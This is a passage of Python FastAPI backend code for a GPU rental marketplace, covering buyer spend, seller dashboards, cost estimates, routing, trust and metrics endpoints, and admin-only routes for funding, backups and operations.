    the vendor root BEFORE uploading any data (zero-trust in the seller)."""
    from db import SellerSpec
    spec = db.query(SellerSpec).filter(SellerSpec.id == spec_id).first()
    if not spec:
        raise HTTPException(status_code=404, detail="Spec not found")
    if not spec.confidential:
        raise HTTPException(status_code=409, detail="Spec is not confidential-attested")
    return {"spec_id": spec.id, "confidential": True, "vendor": spec.tee_vendor,
            "measurement": spec.tee_measurement,
            "report": __import__("json").loads(spec.tee_report)}


@app.get("/specs/{spec_id}/reputation")
def spec_reputation(spec_id: int, user: dict = Depends(get_current_user),
                    db: Session = Depends(get_db)):
    """Auditable reputation breakdown + recent signal events for a spec."""
    spec = _get_spec(db, spec_id)
    if not spec:
        raise HTTPException(status_code=404, detail="Spec not found")
    rep = compute_reputation(db, spec)
    owner = get_user_by_id(db, spec.user_id)
    rep["owner_reputation"] = owner.reputation if owner else None
    events = [{"type": e.event_type, "value": e.value, "meta": e.meta,
               "at": str(e.created_at)} for e in recent_rep_events(db, spec_id)]
    return {"spec_id": spec_id, "reputation": rep, "recent_events": events}


@app.get("/buyer/spend", tags=["wallet"])
def buyer_spend(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """What am I spending, right now, and on what?

    The number a buyer actually wants is not "balance" — it's "what is currently
    burning". Live rentals accrue cost every hour whether or not you're looking."""
    me = get_user_by_username(db, _username(user))
    live = db.query(VMRoute).filter(VMRoute.buyer_id == me.id,
                                    VMRoute.status.in_(["created", "running",
                                                        "migrating"])).all()
    burn = sum((D(v.hourly_rate) for v in live), Decimal(0))
    bookings = db.query(Booking).filter(Booking.buyer_id == me.id).all()
    spent = sum((D(b.gross_amount) for b in bookings
                 if b.status == "released"), Decimal(0))
    escrowed = sum((D(b.gross_amount) for b in bookings
                    if b.status in ("escrowed", "active")), Decimal(0))
    by_tpl = {}
    for v in live:
        by_tpl[v.template] = q(D(by_tpl.get(v.template, 0)) + D(v.hourly_rate))
    return {
        "balance": D(me.balance),
        "in_escrow": q(escrowed),           # already paid, not yet settled
        "spent_lifetime": q(spent),
        "active_instances": len(live),
        "burn_rate_per_hour": q(burn),
        "projected_24h": q(burn * 24),
        "burn_by_template": by_tpl,
        "hours_of_runway": (int(D(me.balance) / burn) if burn > 0 else None),
    }


@app.get("/vms", tags=["compute"])
def list_my_vms(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Every VM the signed-in buyer has launched, with its STABLE address + live status. Powers
    the console; there was previously no way to list your own VMs (only GET /vm/{id})."""
    me = get_user_by_username(db, _username(user))
    vms = []
    for vm in vm_routes_for_buyer(db, me.id):
        vms.append({"vm_id": vm.id, "template": vm.template, "status": vm.status,
                    "url": _vm_url(vm), "port": vm.app_port, "migrations": vm.migrations,
                    "hourly_rate": D(vm.hourly_rate), "hours_left": _hours_left(vm),
                    "created_at": vm.created_at.isoformat() if vm.created_at else None})
    return {"vms": vms}


@app.get("/clusters", tags=["compute"])
def list_my_clusters(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Every distributed cluster the signed-in buyer has launched (status + rendezvous readiness).
    Powers the console; complements GET /jobs/manifest/{id} (a single cluster)."""
    from db import MultiNodeJob
    me = get_user_by_username(db, _username(user))
    rows = (db.query(MultiNodeJob)
            .filter(MultiNodeJob.buyer_id == me.id, MultiNodeJob.kind == "distributed")
            .order_by(MultiNodeJob.id.desc()).limit(50).all())
    return {"clusters": [
        {"job_id": j.id, "status": j.status, "world_size": j.total_segments,
         "backend": j.backend, "rendezvous_ready": bool(j.master_addr),
         "created_at": j.created_at.isoformat() if j.created_at else None,
         "manifest_url": f"/jobs/manifest/{j.id}"} for j in rows]}


@app.get("/onboarding", tags=["account"])
def onboarding(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Where am I, and what do I do next?

    Two different funnels — a buyer and a host want completely different things, and a
    single dashboard serves neither. This returns the checklist for whichever they are,
    with the NEXT step marked. It exists because verification now gates payouts: without
    a checklist, a seller hits that wall with no idea why."""
    me = get_user_by_username(db, _username(user))
    specs = db.query(SellerSpec).filter(SellerSpec.user_id == me.id).all()
    is_host = bool(specs) or me.role == "seller"

    if is_host:
        attested = [s for s in specs if s.attested]
        live = [s for s in attested if spec_is_live(s)]
        earned = D(me.earnings) > 0
        has_method = bool(list_payout_methods(db, me.id))
        steps = [
            {"key": "list_hardware", "title": "List your hardware",
             "detail": "One command on the machine with the GPU.",
             "done": bool(specs), "action": "/install"},
            {"key": "verify_hardware", "title": "Prove the hardware",
             "detail": "The agent signs a hardware report. Until it does, buyers can't see you.",
             "done": bool(attested), "action": "/install"},
            {"key": "come_online", "title": "Come online",
             "detail": "Heartbeat every 30s. Sleep/hibernate takes you offline.",
             "done": bool(live), "action": "/account"},
            {"key": "verify_email", "title": "Verify your email",
             "detail": "Required before you can be paid — and it's how we reach you if "
                       "your node has a problem.",
             "done": bool(me.email_verified), "action": "/account"},
            {"key": "payout_method", "title": "Add a payout destination",
             "detail": "Bank, USDC, or gift card. New destinations wait "
                       f"{PAYOUT_COOLING_OFF_H}h before they can receive funds.",
             "done": has_method, "action": "/account"},
            {"key": "first_earning", "title": "Earn your first dollar",
             "detail": "Rentals settle automatically when they finish.",
             "done": earned, "action": "/account"},
        ]
    else:
        booked = db.query(Booking).filter(Booking.buyer_id == me.id).count()
        steps = [
            {"key": "fund_wallet", "title": "Add funds",
             "detail": "You prepay into escrow; unused hours are refunded when you stop.",
             "done": D(me.balance) > 0, "action": "/account"},
            {"key": "browse", "title": "Find a GPU",
             "detail": "Live inventory, priced by the hosts themselves.",
             "done": booked > 0, "action": "/marketplace"},
            {"key": "first_launch", "title": "Launch your first workload",
             "detail": "Pick a template, press Launch. We place it on the cheapest "
                       "verified node that fits.",
             "done": booked > 0, "action": "/account"},
            {"key": "verify_email", "title": "Verify your email",
             "detail": "So we can tell you when a node fails or a job finishes.",
             "done": bool(me.email_verified), "action": "/account"},
        ]

    done = sum(1 for s in steps if s["done"])
    nxt = next((s for s in steps if not s["done"]), None)
    return {
        "role": "host" if is_host else "buyer",
        "steps": steps,
        "completed": done, "total": len(steps),
        "percent": round(100 * done / len(steps)),
        "next_step": nxt,
    }


@app.get("/seller/dashboard", tags=["seller"])
def seller_dashboard(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Everything a host needs — and crucially, WHY THEY ARE NOT EARNING.

    Every pilot seller asks this within a day: "my GPU is on, why is nothing running?"
    A dashboard that only shows earnings answers it with a zero, which tells them
    nothing. So we diagnose it: are you online? attested? priced above the market? are
    all your units already busy? Each blocker comes with the fix."""
    me = get_user_by_username(db, _username(user))
    specs = db.query(SellerSpec).filter(SellerSpec.user_id == me.id).all()
    if not specs:
        return {"nodes": [], "totals": {"earnings": D(me.earnings), "nodes": 0},
                "blockers": [{"issue": "You haven't listed any hardware yet.",
                              "fix": "Install the agent — one command on the machine "
                                     "with the GPU.", "action": "/install"}]}

    # One pass over live, attested specs: the price median (for the "priced above market"
    # blocker) AND per-GPU-class demand (busy/total) that feeds the price recommendation.
    market = []
    class_busy, class_total = {}, {}
    for s in db.query(SellerSpec).filter(SellerSpec.attested.is_(True)).all():
        if not spec_is_live(s):
            continue
        market.append(D(s.price_per_hour))
        ck = (s.gpu_model or "cpu").lower()
        t = s.total_units or 1
        class_total[ck] = class_total.get(ck, 0) + t
        class_busy[ck] = class_busy.get(ck, 0) + max(0, t - (s.available_units or 0))
    median = sorted(market)[len(market)//2] if market else None

    import pricing_engine
    nodes, blockers = [], []
    for sp in specs:
        live = spec_is_live(sp)
        total = (sp.jobs_completed or 0) + (sp.jobs_failed or 0)
        busy = (sp.total_units or 0) - (sp.available_units or 0)
        util = round(100.0 * busy / sp.total_units, 1) if sp.total_units else 0.0
        rep = compute_reputation(db, sp)
        earned = sum((D(b.seller_payout) for b in db.query(Booking).filter(
                        Booking.spec_id == sp.id, Booking.status == "released").all()),
                     Decimal(0))
        # Explainable price recommendation (same engine as /nodes/*/price/recommendation and
        # the auto-price batch) so the seller sees a suggested number + why, inline.
        ck = (sp.gpu_model or "cpu").lower()
        ct = class_total.get(ck, 0)
        class_util = (class_busy.get(ck, 0) / ct) if ct else (util / 100.0)
        rec = pricing_engine.recommend(
            cloud_reference_for(sp.gpu_model),
            perf_reference=pricing_engine.performance_reference_price(sp.gpu_model),
            utilization=class_util,
            trust_level=trust_level_for(sp).get("level"),
            benchmark_verdict=getattr(sp, "benchmark_verdict", None),
            confidential=dbmod.spec_confidential_active(sp),
            region_verified=bool(getattr(sp, "region_verified", False)),
            reputation=me.reputation,
            min_price=(float(sp.min_price) if sp.min_price is not None else None),
            max_price=(float(sp.max_price) if sp.max_price is not None else None),
            current_price=float(sp.price_per_hour or 0),
        )
        nodes.append({
            "id": sp.public_id, "spec_id": sp.id, "gpu_model": sp.gpu_model,
            "online": live, "attested": bool(sp.attested),
            "price_per_hour": D(sp.price_per_hour),
            "units_total": sp.total_units, "units_busy": busy,
            "utilization_pct": util,
            "jobs_completed": sp.jobs_completed, "jobs_failed": sp.jobs_failed,
            "success_rate": round(100.0 * sp.jobs_completed / total, 1) if total else None,
            "reputation": rep["score"] if isinstance(rep, dict) else rep,
            "earned_total": q(earned),
            "suggested_price": rec["recommended_price"],
            "suggested_reason": rec["explanation"],
            "savings_vs_cloud_pct": rec["savings_vs_cloud_pct"],
            "auto_price": bool(sp.auto_price),
            "last_seen": sp.last_seen.isoformat() if sp.last_seen else None,
        })

        # --- the diagnosis ---
        if not sp.attested:
            blockers.append({"node": sp.public_id,
                             "issue": "This node isn't verified, so it's hidden from buyers.",
                             "fix": "The agent proves the hardware on startup. Check it's "
                                    "running: `petabyte status`."})
        elif not live:
            blockers.append({"node": sp.public_id,
                             "issue": "This node stopped sending heartbeats — buyers can't see it.",
                             "fix": "Check the machine is awake and the agent is running. "
                                    "Sleep/hibernate will do this."})
        elif sp.available_units == 0:
            blockers.append({"node": sp.public_id,
                             "issue": "Fully booked — every unit is rented.",
                             "fix": "This is a good problem. Add capacity or raise your price."})
        elif median and D(sp.price_per_hour) > median * D("1.25"):
            blockers.append({"node": sp.public_id,
                             "issue": f"Priced {int((D(sp.price_per_hour)/median - 1) * 100)}% "
                                      f"above the market median (${qc(median)}/hr) — buyers pick "
                                      f"the cheapest node that fits.",
                             "fix": f"Try ${qc(median)}/hr, or turn on auto-pricing."})
        elif not me.can_accept_paid_jobs:
            blockers.append({"node": sp.public_id,
                             "issue": "Your account can't take paid work yet.",
                             "fix": "Reputation is below the threshold — run test jobs."})

    if not me.email_verified:
        blockers.append({"issue": "Your email isn't verified, so you can't be paid out.",
                         "fix": "Verify your email — it's also how we reach you if your "
                                "node has a problem.", "action": "/account"})

    live_nodes = [n for n in nodes if n["online"]]
    return {
        "nodes": nodes,
        "totals": {
            "earnings_available": D(me.earnings),
            "earned_lifetime": q(sum((D(n["earned_total"]) for n in nodes), Decimal(0))),
            "nodes": len(nodes), "nodes_online": len(live_nodes),
            "avg_utilization_pct": round(
                sum(n["utilization_pct"] for n in live_nodes) / len(live_nodes), 1)
                if live_nodes else 0.0,
            "market_median_price": qc(median) if median else None,
        },
        # If this list is empty and you're still earning nothing, it's demand, not you.
        "blockers": blockers,
    }


class EstimateModel(BaseModel):
    spec_id: Optional[str] = None       # public handle
    template: Optional[str] = None
    hours: int = Field(1, ge=1, le=720)


@app.post("/estimate", tags=["marketplace"])
def estimate_cost(data: EstimateModel, db: Session = Depends(get_db)):
    """What will this actually cost me? Answered BEFORE the buyer commits.

    Nobody should click Launch without knowing the number. We show the total, the
    hourly rate, what happens if they stop early, and — honestly — what it would have
    cost on a comparable public cloud, but only where we can compare like for like."""
    spec = None
    if data.spec_id:
        from db import get_spec_by_public_id
        spec = get_spec_by_public_id(db, data.spec_id)
    else:
        # same selection the router would make: cheapest eligible live node
        cands = [s for s in db.query(SellerSpec).filter(
                    SellerSpec.attested.is_(True), SellerSpec.available_units > 0).all()
                 if spec_is_live(s)]
        if data.template:
            tpl = TEMPLATES.get(data.template)
            if tpl and tpl.get("gpu"):
                cands = [s for s in cands if s.gpu_model]
            # Price the host placement will actually use: a template with a VRAM
            # recommendation is only ever placed on a host that meets it, so a
            # known-too-small GPU must not set the quoted price. Hosts that never
            # reported VRAM are left in (we can't prove them too small — same as
            # before this gate existed) to stay consistent with /launch.
            mv = template_min_vram(data.template)
            if mv:
                cands = [s for s in cands if (not s.vram_gb) or s.vram_gb >= mv]
        spec = min(cands, key=lambda s: D(s.price_per_hour)) if cands else None

    if not spec:
        raise HTTPException(status_code=404, detail={
            "code": "NO_CAPACITY",
            "message": "No matching GPU is available right now."})

    rate = D(spec.price_per_hour)
    hours = data.hours
    total = q(rate * D(hours))
    fee = q(total * PLATFORM_TAKE_RATE)
    ref = cloud_reference_for(spec.gpu_model)
    cloud_total = q(D(ref) * D(hours)) if ref else None

    return {
        "gpu_model": spec.gpu_model, "region": spec.region,
        "price_per_hour": rate, "hours": hours,
        "total": total,
        "min_charge": q(rate),                  # one hour minimum
        "platform_fee_included": fee,           # taken FROM the rental, not added on top
        "you_pay_now": total,                   # prepaid into escrow
        "if_you_stop_after_1h": {
            "charged": q(rate),
            "refunded": q(total - rate),
        },
        "cloud_comparison": ({"reference_per_hour": D(ref),
                              "reference_total": cloud_total,
                              "you_save": q(cloud_total - total)}
                             if cloud_total and cloud_total > total else None),
        "notes": [
            "You prepay into escrow. Stop early and the unused hours are refunded.",
            "Minimum charge is one hour.",
            "The 10% platform fee is taken from the rental, not added to your bill.",
        ],
    }


@app.get("/marketplace/stats", tags=["marketplace"])
def marketplace_stats(db: Session = Depends(get_db)):
    """Public hero numbers for the dashboard."""
    from db import SellerSpec, Task, Booking, Platform
    nodes_online = db.query(SellerSpec).filter(SellerSpec.status == "online").count()
    specs_listed = db.query(SellerSpec).filter(SellerSpec.attested == True).count()  # noqa: E712
    jobs_completed = db.query(Task).filter(Task.status == "completed").count()
    gmv = db.query(func.coalesce(func.sum(Booking.gross_amount), 0.0)).filter(Booking.test == False).scalar() or 0.0  # noqa: E712 exclude sandbox
    plat = db.query(Platform).first()
    demo_present = db.query(SellerSpec).filter(SellerSpec.is_demo == True).count() > 0  # noqa: E712
    return {"nodes_online": nodes_online, "specs_listed": specs_listed,
            "jobs_completed": jobs_completed, "gmv": round(float(gmv), 2),
            "platform_revenue": round(plat.revenue, 2) if plat else 0.0,
            "contains_demo_data": demo_present}


@app.get("/marketplace/health", tags=["marketplace"])
def marketplace_health(db: Session = Depends(get_db)):
    """The operational heartbeat: supply / demand / economics / quality, all live DB
    aggregates for the current money mode. Zeros/nulls mean no data yet (never faked)."""
    import marketplace_insight as mi
    return mi.health(db)


@app.get("/marketplace/health/summary", tags=["marketplace"])
def marketplace_health_summary(db: Session = Depends(get_db)):
    """A plain-language summary generated from the live health numbers (the honest,
    LLM-swappable substrate for a natural-language exec/investor dashboard)."""
    import marketplace_insight as mi
    h = mi.health(db)
    return {"summary": mi.summarize_health(h), "health": h}


class RouteModel(BaseModel):
    workload: Optional[str] = None
    gpu_class: Optional[str] = None
    min_vram: Optional[int] = Field(default=None, ge=0)
    region: Optional[str] = None
    country: Optional[str] = None
    confidential: Optional[bool] = None
    max_price_per_hour: Optional[float] = Field(default=None, gt=0)
    min_reputation: Optional[int] = Field(default=None, ge=0, le=100)
    redundancy: int = Field(default=1, ge=1, le=10)
    hours: int = Field(default=1, ge=1, le=720)


@app.post("/route", tags=["marketplace"])
def route_explain(data: RouteModel, db: Session = Depends(get_db)):
    """Explainable routing: pick the best GPU(s) for the stated intent and show WHY —
    a predicted success probability from real historical signals, plus a plain checklist
    (price / region / reliability / CUDA / trust / availability / historical success).
    This is 'sell intelligence, not listings' — every number is real; a node with no
    history shows the honest verified-node prior, never a fabricated stat."""
    import marketplace_insight as mi
    intent = {k: v for k, v in data.model_dump().items() if v is not None}
    plan = select_plan(db, intent, _with_caches=True)
    # Reuse the specs + reputation already loaded/computed by select_plan — no per-item
    # spec fetch and no reputation recompute for selected + alternatives (query explosion).
    # /route is the ONLY opt-in caller of the caches, and pops them here before responding.
    specs = plan.pop("_specs", {})
    rep_cache = plan.pop("_reputation", {})

    def annotate(item):
        spec = specs.get(item["spec_id"]) or _get_spec(db, item["spec_id"])
        if spec is not None:
            rep = rep_cache.get(spec.id)
            if rep is None:
                rep = compute_reputation(db, spec)
                rep_cache[spec.id] = rep
            item["predicted_success"] = mi.predict_success(spec, rep)
        return item
    plan["selected"] = [annotate(i) for i in plan.get("selected", [])]
    plan["alternatives"] = [annotate(i) for i in plan.get("alternatives", [])]
    plan["checklist"] = mi.route_checklist(plan, intent)
    return plan


@app.get("/sellers/{public_id}/trust", tags=["marketplace"])
def seller_trust(public_id: str, db: Session = Depends(get_db)):
    """A seller node's trust score (0-100) + star rating + the real historical signals
    behind it. Untracked dimensions are null on purpose — surfaced honestly, never faked."""
    from db import get_spec_by_public_id
    import marketplace_insight as mi
    spec = get_spec_by_public_id(db, public_id)
    if not spec:
        raise HTTPException(status_code=404, detail="GPU not found")
    return mi.trust_score(db, spec)


@app.get("/metrics/overview", tags=["marketplace"])
def metrics_overview(request: Request, db: Session = Depends(get_db),
                     scope: str = "all", since: Optional[str] = None,
                     until: Optional[str] = None):
    """Investor / operations metrics from real DB queries. `scope` = all|demo|real
    keeps seeded demo data separate from real traction; the response states which
    scope produced the numbers so the UI can badge demo data. Definitions:
    /metrics/definitions and docs/METRIC_DEFINITIONS.md.

    Public, but REAL money VOLUMES (gmv / platform_revenue / seller_payouts) are
    business-confidential once real money flows, so for non-admin callers on the real/all
    scopes those three absolutes are redacted to null with economics.restricted=true (audit
    L1). Everyone still sees ratios, counts and buyer savings; the curated public money
    surface is /metrics/traction. Demo scope is never redacted — it is clearly-labeled
    synthetic data behind the public demo dashboard."""
    from metrics import compute_metrics
    if scope not in ("all", "demo", "real"):
        raise HTTPException(status_code=400, detail="scope must be all|demo|real")
    data = compute_metrics(db, cloud_reference_for, scope=scope, since=since,
                           until=until, default_reference=float(AWS_REFERENCE_PRICE))
    if scope != "demo" and not _viewer_is_admin(request, db):
        econ = data.get("economics")
        if isinstance(econ, dict):
            for _k in ("gmv", "platform_revenue", "seller_payouts"):
                if _k in econ:
                    econ[_k] = None
            econ["restricted"] = True
    return data


@app.get("/metrics/definitions", tags=["marketplace"])
def metrics_definitions():
    """Plain-language definition of every metric — no vanity numbers without context."""
    return {"definitions": METRIC_DEFINITIONS}


@app.get("/metrics/traction", tags=["marketplace"])
def metrics_traction(db: Session = Depends(get_db)):
    """PUBLIC investor traction — a curated, honest subset of the CANONICAL funding snapshot
    (LIVE money only; TEST and demo excluded). Read-only, no auth, no PII, and no sensitive
    absolutes (platform revenue, seller liability and payouts are omitted; GMV + ratios only).
    Zeros are honest: the platform runs Stripe in TEST mode until launch, so real GMV is $0
    by design — never a fabricated number. Powers the public /traction page."""
    import funding_metrics as _fm
    return _fm.public_traction(db)


# ------------------- ADMIN (platform operators) -------------------
# Admins are named in the ADMIN_USERS env var (comma-separated usernames or
# emails). No DB column, no migration; set it at deploy time. Every /admin/*
# route is gated by require_admin, so the page is safe to serve to anyone —
# it shows nothing until an admin token loads the data.

def _admin_allowlist() -> set:
    return {u.strip().lower() for u in os.getenv("ADMIN_USERS", "").split(",") if u.strip()}

def _is_admin(u) -> bool:
    # An admin identity must be one the user cannot silently forge. Two rules:
    #   * an email-shaped allowlist entry ("has @") is satisfied ONLY by a VERIFIED matching
    #     email. Never by an unverified email (POST /account/email sets an arbitrary address —
    #     verification requires the emailed-token flow, i.e. control of the inbox) and never by
    #     a username (usernames have no character restriction, so "info@petabyte.market" is a
    #     registerable username; matching it against an email entry would be escalation).
    #   * a plain (no-@) allowlist entry is matched against the username.
    if not u:
        return False
    allow = _admin_allowlist()
    if not allow:
        return False
    uname = (u.username or "").lower()
    email = (getattr(u, "email", None) or "").lower()
    verified = bool(getattr(u, "email_verified", False))
    for entry in allow:
        if "@" in entry:
            if email and verified and entry == email:
                return True
        elif uname and entry == uname:
            return True
    return False

def require_admin(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    if not _is_admin(me):
        raise HTTPException(status_code=403, detail="Admin access required")
    return me


def _viewer_is_admin(request: Request, db: Session) -> bool:
    """Best-effort, NON-raising admin check for endpoints that are public but redact
    confidential fields for anonymous callers (e.g. /metrics/overview money volumes). Resolves
    a Bearer header or the pb_session cookie if present; returns False for anonymous, invalid,
    or non-admin callers — it NEVER raises, so it can't turn a public endpoint into a 401."""
    raw = None
    ah = request.headers.get("authorization") or ""
    if ah.lower().startswith("bearer "):
        raw = ah[7:].strip()
    if not raw:
        raw = request.cookies.get(SESSION_COOKIE)
    if not raw:
        return False
    try:
        claims = verify_token(raw)
        return _is_admin(get_user_by_username(db, claims.get("sub")))
    except Exception:
        return False


@app.get("/admin/whoami")
def admin_whoami(me=Depends(require_admin)):
    """200 only for admins — lets the UI reveal the Admin link."""
    return {"admin": True, "username": me.username}


@app.get("/admin/funding", tags=["admin"])
def admin_funding(scope: str = "real", me=Depends(require_admin), db: Session = Depends(get_db)):
    """Read-only CANONICAL funding metrics, computed live from authoritative DB rows (never
    fabricated). This is the investor/founder control-plane number source: GMV, net margin,
    active buyers/sellers/GPUs, utilization, unfulfilled demand, retention. `scope`:
    real (LIVE money) | test | demo | all — REAL never includes TEST/demo. Admin-only."""
    import funding_metrics as _fm
    if scope not in ("real", "test", "demo", "all"):
        raise HTTPException(status_code=422, detail="scope must be one of real|test|demo|all")
    return _fm.funding_snapshot(db, scope=scope)


@app.post("/admin/observability/sentry-test", tags=["admin"])
def admin_sentry_test(request: Request, me=Depends(require_admin), db: Session = Depends(get_db)):
    """Deliberately send ONE test event to Sentry, to verify the pipeline end-to-end.

    Guarded three ways so it can never be an abuse surface:
      * admin-only (require_admin);
      * REFUSED in production (404) — this is a TEST/staging verification tool only;
      * a no-op 409 if Sentry isn't actually active (no DSN configured).
    It captures a benign message (never raises, never crashes the process) and returns the
    Sentry event id — never the DSN or any secret."""
    if obsmod.ENVIRONMENT == "production":
        raise HTTPException(status_code=404, detail="not found")
    if not obsmod.health()["sentry"]["active"]:
        raise HTTPException(status_code=409,
                            detail="Sentry is not active (no SENTRY_DSN configured)")
    # Do NOT tag the event with the admin's identity — that would ship a user identifier to an
    # external service (Sentry runs send_default_pii=False for exactly this reason). Who triggered
    # the selftest is recorded locally in the audit log below instead.
    event_id = obsmod.capture_message(
        "Petabyte Sentry selftest (admin-triggered)", level="error",
        selftest="true")
    audit(db, "observability.sentry_test", actor=me, resource_type="observability",
          resource_id=str(event_id or "none"), ip=_client_ip(request))
    return {"sent": bool(event_id), "event_id": event_id,
            "environment": obsmod.SENTRY_ENVIRONMENT, "release": obsmod.SENTRY_RELEASE}


@app.get("/admin/financial-integrity", tags=["admin"])
def admin_financial_integrity(me=Depends(require_admin), db: Session = Depends(get_db)):
    """On-demand financial-integrity heartbeat (#286): the same SQL ledger invariants +
    payout backlog Prometheus watches, for the incident runbook. `ok` is false on ANY
    imbalance — treat that as a P0 (see docs/runbooks/FINANCIAL_INTEGRITY_INCIDENT.md)."""
    fi = dbmod.financial_integrity(db)
    pb = dbmod.payout_backlog(db)
    return {"ok": fi["balanced"], "ledger": fi, "payout_backlog": pb}


@app.get("/admin/dataset/authenticity", tags=["admin"])
def admin_dataset_authenticity(limit: int = Query(1000, ge=1, le=50000),
                               since_id: int = Query(0, ge=0),
                               fmt: str = Query("json", alias="format"),
                               me=Depends(require_admin), db: Session = Depends(get_db)):
    """Export the GPU-authenticity TRAINING dataset — feature rows (score + ratio-to-public-
    reference per metric) + labels (fraud / verdict), plus headline stats. GPU/perf signals only,
    no PII. `format=jsonl` returns newline-delimited JSON for direct ingestion by a trainer.
    `since_id` enables incremental pulls."""
    import training_data as td
    rows = td.export_authenticity_dataset(db, limit=limit, since_id=since_id)
    if fmt == "jsonl":
        return PlainTextResponse(td.to_jsonl(rows), media_type="application/x-ndjson")
    return {"stats": td.dataset_stats(db), "count": len(rows), "rows": rows}


@app.get("/admin/backups", tags=["admin"])
def admin_list_backups(limit: int = Query(50, ge=1, le=500),
                       me=Depends(require_admin), db: Session = Depends(get_db)):
    """Disaster-recovery status of the PLATFORM database backups: the health summary (last
    successful backup + its age, counts, total size) plus the most recent backup rows."""
    import backup as _bk
    rows = dbmod.list_database_backups(db, limit=limit)
    return {"status": _bk.backup_status(db), "count": len(rows), "backups": [{
        "id": r.id, "s3_uri": r.s3_uri, "s3_key": r.s3_key, "engine": r.engine,
        "environment": r.environment, "size_bytes": r.size_bytes, "sha256": r.sha256,
        "status": r.status, "error": r.error,
        "created_at": r.created_at.isoformat() if r.created_at else None,
    } for r in rows]}


@app.post("/admin/backups/run", tags=["admin"])
def admin_run_backup(retention: int = Query(None, ge=0, le=100000),
                     me=Depends(require_admin), db: Session = Depends(get_db)):
    """Take a database backup NOW (dump -> gzip -> S3 -> record -> prune). Idempotent to run
    often; usually driven by cron / a systemd timer via scripts/backup_database.py. Returns the
    backup summary, or 503 with the reason if the dump/upload fails (which also records a
    status=failed row so 'no recent backup' alerts fire)."""
    import backup as _bk
    try:
        return _bk.create_backup(db, retention=retention)
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"backup failed: {e}")


@app.post("/admin/backups/{backup_id}/verify", tags=["admin"])
def admin_verify_backup(backup_id: int, me=Depends(require_admin), db: Session = Depends(get_db)):
    """Integrity-check a stored backup: download it and confirm its SHA-256 matches what we
    recorded and that it still decompresses."""
    import backup as _bk
    try:
        return _bk.verify_backup(db, backup_id)
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"verify failed: {e}")


@app.get("/admin/overview")
def admin_overview(me=Depends(require_admin), db: Session = Depends(get_db)):
    from db import User, SellerSpec, Task, Booking, Platform, Payout
    def _c(q):
        return db.query(func.count()).select_from(q).scalar() or 0
    users_total = db.query(User).count()
    sellers = db.query(User).filter(User.role == "seller").count()
    specs_total = db.query(SellerSpec).count()
    specs_online = db.query(SellerSpec).filter(SellerSpec.status == "online").count()
    specs_attested = db.query(SellerSpec).filter(SellerSpec.attested == True).count()  # noqa: E712
    confidential = db.query(SellerSpec).filter(SellerSpec.confidential == True).count()  # noqa: E712
    jobs = {s: db.query(Task).filter(Task.status == s).count()
            for s in ("completed", "running", "pending", "failed")}
    gmv = db.query(func.coalesce(func.sum(Booking.gross_amount), 0.0)).filter(Booking.test == False).scalar() or 0.0  # noqa: E712 exclude sandbox
    plat = db.query(Platform).first()
    pend = db.query(Payout).filter(Payout.status == "requested")
    pend_n = pend.count()
    pend_sum = db.query(func.coalesce(func.sum(Payout.amount_usd), 0.0)).filter(
        Payout.status == "requested").scalar() or 0.0
    return {
        "users": {"total": users_total, "sellers": sellers, "buyers": users_total - sellers},
        "specs": {"total": specs_total, "online": specs_online,
                  "attested": specs_attested, "confidential": confidential},
        "jobs": jobs,
        "gmv": round(float(gmv), 2),
        "platform_revenue": round(plat.revenue, 2) if plat else 0.0,
        "payouts_pending": {"count": pend_n, "amount": round(float(pend_sum), 2)},
    }


@app.get("/admin/ops")
def admin_ops(me=Depends(require_admin), db: Session = Depends(get_db)):
    """Extended operational snapshot for the admin console: live marketplace utilization,
    VMs, distributed clusters, disk rental, teams, escrowed buyer money, and platform-health
    invariants (ledger balance + payout backlog). Computed live from authoritative rows."""
    from db import (SellerSpec, Booking, VMRoute, MultiNodeJob, Organization,
                    financial_integrity, payout_backlog)
    online = db.query(SellerSpec).filter(SellerSpec.status == "online").count()
    avail_units = int(db.query(func.coalesce(func.sum(SellerSpec.available_units), 0))
                      .filter(SellerSpec.status == "online").scalar() or 0)
    booked = db.query(VMRoute).filter(
        VMRoute.status.in_(("starting", "running", "migrating"))).count()
    capacity = avail_units + booked
    util = round(100.0 * booked / capacity, 1) if capacity else 0.0
    vm_migr = int(db.query(func.coalesce(func.sum(VMRoute.migrations), 0)).scalar() or 0)
    clusters = {s: db.query(MultiNodeJob).filter(
        MultiNodeJob.kind == "distributed", MultiNodeJob.status == s).count()
        for s in ("running", "assembling", "complete", "failed")}
    disk_nodes = db.query(SellerSpec).filter(SellerSpec.disk_enabled == True).count()  # noqa: E712
    disk_gb = int(db.query(func.coalesce(func.sum(SellerSpec.disk_alloc_gb), 0))
                  .filter(SellerSpec.disk_enabled == True).scalar() or 0)  # noqa: E712
    orgs_n = db.query(Organization).count()
    orgs_bal = float(db.query(func.coalesce(func.sum(Organization.balance), 0)).scalar() or 0)
    in_escrow = float(db.query(func.coalesce(func.sum(Booking.gross_amount), 0.0)).filter(
        Booking.status == "escrowed", Booking.test == False).scalar() or 0.0)  # noqa: E712
    fi = financial_integrity(db)
    pb = payout_backlog(db)
    return {
        "marketplace": {"online": online, "available_units": avail_units,
                        "booked": booked, "utilization_pct": util},
        "vms": {"active": booked, "migrations_total": vm_migr},
        "clusters": clusters,
        "disk": {"nodes": disk_nodes, "alloc_gb": disk_gb},
        "teams": {"count": orgs_n, "balance": round(orgs_bal, 2)},
        "in_escrow": round(in_escrow, 2),
        "health": {
            "ledger_balanced": fi["balanced"],
            "imbalanced_tx": fi["imbalanced_tx"],
            "payout_backlog": pb.get("unbatched", 0),
            "payout_backlog_age_hours": round((pb.get("oldest_age_seconds", 0) or 0) / 3600.0, 1),
        },
    }


@app.get("/admin/users")
def admin_users(me=Depends(require_admin), db: Session = Depends(get_db),
                q: Optional[str] = None, limit: int = Query(100, le=500)):
    from db import User
    query = db.query(User)
    if q:
        like = f"%{q.lower()}%"
        query = query.filter(func.lower(User.username).like(like))
    rows = query.order_by(User.id.desc()).limit(limit).all()
    return {"users": [{
        "id": u.id, "username": u.username, "email": u.email,
        "role": u.role, "reputation": u.reputation,
